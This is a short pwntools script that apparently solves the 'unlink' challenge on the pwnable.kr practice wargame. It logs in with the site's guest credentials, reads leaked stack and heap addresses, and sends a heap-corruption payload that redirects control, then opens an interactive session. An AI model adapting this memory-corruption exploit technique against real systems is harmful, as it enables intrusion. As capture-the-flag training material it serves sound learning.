from pwn import *
s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
r = s.process('./unlink')
r.recvuntil(b'stack address leak: ')
rbp = int(r.recvline(), 16) + 0x14
print(f'rbp = {hex(rbp)}')
r.recvuntil(b'heap address leak: ')
heapleak = int(r.recvline(), 16)
print(f'A = {hex(heapleak)}')
payload = b'a' * 0x10 + p32(rbp + 1) + p32(heapleak - ((heapleak-0x2f)%0xff))
print(payload)
r.sendline(payload)
r.interactive()
